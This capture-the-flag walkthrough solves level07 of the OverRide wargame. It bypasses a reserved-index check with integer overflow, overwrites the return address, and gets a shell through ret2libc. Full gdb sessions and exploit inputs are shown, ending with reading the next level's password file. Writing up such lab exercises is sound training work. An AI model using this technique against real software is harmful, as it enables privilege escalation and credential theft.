## WALKTHROUGH - LEVEL07

---

When we execute the binary, we notice we can store and read values from the stack of the program. There are some protections on the binary: we can find a canary and protected indexs for example.

The program allocates a stack of 100 bytes for its number storage service, as 25 zones of 4 bytes. It reads or store the numbers we specify there by multiplying our index by 4. However, when we test higher numbers than 25, the programm still tries to access to the values located there. So we can suppose we could write data at strategic places of the stack, like the return address.

We know that the buffer starts at esp+0x24. We use gdb to determine the index where the return address will be:

```
(gdb) run
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048732 in main ()
(gdb) info reg $esp $ebp
esp            0xffffd430	0xffffd430
ebp            0xffffd618	0xffffd618
(gdb) p (0xffffd618-0xffffd430-0x24)/4+1
$3 = 114
```

So we can write on the return address with the index 114. However when we try do do so:

```
Input command: store
 Number: 40
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

We know that the **index input is multiplied by 4**, and that the **number input is stored at the address designated by the result of the multiplication**. So we can try using a **negative number**, whose **value when multiplied by 4 will be equal to 114*4**.
We use this website to find the number: [RapidTables-Number Conversion](https://www.rapidtables.com/convert/number/decimal-to-binary.html)

```sh
114 is equal to:
         0000 0000 0000 0000 0000 0000 0111 0010
To make it negative we change the MSB:
         1000 0000 0000 0000 0000 0000 0111 0010
Which gives us: 
         -2147483534
```


When we test it, and when we look at the stack, we see **the value located at 0xffffd61c changed**.

```sh
(gdb) c
Continuing.
Input command: store
 Number: 64
 Index: -2147483534
 Completed store command successfully

Breakpoint 1, 0x08048857 in main ()
(gdb) x/wx 0xffffd61c
0xffffd61c:	0x00000040
```
---

Now that we have access to the return address, we can use it to make a **ret2libc attack**, so we **search for** the address of the **system function in the libc** and the **address of a string "/bin/sh"** to put as the system argument:

```sh
(gdb) p system
$17 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc mappings
	Start Addr   End Addr       Size     Offset objfile
[...]
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
[...]
(gdb) find 0xf7e2c000, +9999999, "/bin/sh"
0xf7f897ec
[...]
1 pattern found.
```

So the **system** address is **0xf7e6aed0** or **4159090384** in decimal, and will need to be stored at the index **114**, or **-2147483534**.

We don't need to change the return address of system, so we don't need to change the 115 index content.

However, the **116** index will **hold the argument** for the call to system, so we need to put the **address of the "/bin/sh" string** there, which is 0xf7f897ec or **4160264172**.

---

So when we **execute the program with the right values**:

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: -2147483534
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
